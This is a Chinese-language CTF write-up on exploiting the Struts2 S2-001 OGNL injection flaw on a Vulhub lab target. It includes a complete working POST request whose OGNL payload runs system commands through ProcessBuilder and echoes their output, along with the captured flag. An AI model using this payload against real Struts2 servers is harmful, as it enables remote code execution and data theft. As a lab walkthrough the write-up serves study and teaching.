📝 Struts2 S2-001 OGNL 表达式注入 RCE 实战 Writeup

一、 靶机信息与漏洞简介

· 靶机环境：Struts2 S2-001 (Vulhub 环境)
· 漏洞类型：远程代码执行 (RCE) / OGNL 表达式注入
· 漏洞原理：Struts2 在处理表单验证失败时，会将用户提交的参数值使用 OGNL 表达式 %{value} 进行解析并回填。攻击者可构造恶意的 OGNL 表达式，通过 Java 的 ProcessBuilder 执行任意系统命令，并通过重写 HttpServletResponse 获取命令回显。

二、 渗透过程详解

1. 探测与踩坑记录

访问 /login.action，发现直接 GET 请求会报 500 空指针异常。进入登录表单后，提交测试 Payload %{1+1}，页面未能正常回显 2，使用 Burp 抓包发现请求返回了 500 Internal Server Error。
原因分析：在 application/x-www-form-urlencoded 的 POST 请求中，百分号 % 是 URL 编码的起始符。Tomcat 解析到 %{ 时会因为不符合 URL 编码规范而报错，导致 Payload 未能进入 OGNL 引擎。

2. 绕过限制与命令执行

将 Payload 开头的 % 替换为其 URL 编码 %25，成功绕过了 Tomcat 的解析限制。
在 Burp Suite 的 Repeater 模块中发送以下 POST 请求，使用 ProcessBuilder 执行 env 命令：

http
POST /login.action HTTP/1.1
Host: direct-ctf2.dasctf.com:25164
Content-Type: application/x-www-form-urlencoded
Connection: close

username=%25{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"env"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}&password=123&submit=Submit


3. 收割 Flag

发送请求后，Response 返回 200 OK。在 HTML 页面的 <a> 标签回显处，成功打印出了大量的系统环境变量信息。
向下滚动至最后一行，成功找到目标：
FLAG=CTF2{bbbE88ad-0459-4084-b68f-adc6dabdc830}

三、 总结与反思

1. URL 编码陷阱：在发送包含 % 等特殊字符的 POST Payload 时，务必注意 Content-Type 的编码问题，很多时候用 %25 代替 % 就能“起死回生”。
2. OGNL 回显技巧：ProcessBuilder 配合 HttpServletResponse 是 Struts2 漏洞利用中获取命令回显的最经典、最稳妥的方法。
3. 环境变量的重要性：再次印证了在目前的 CTF 靶机中，env 命令是寻找 Flag 的“黄金搭档”。
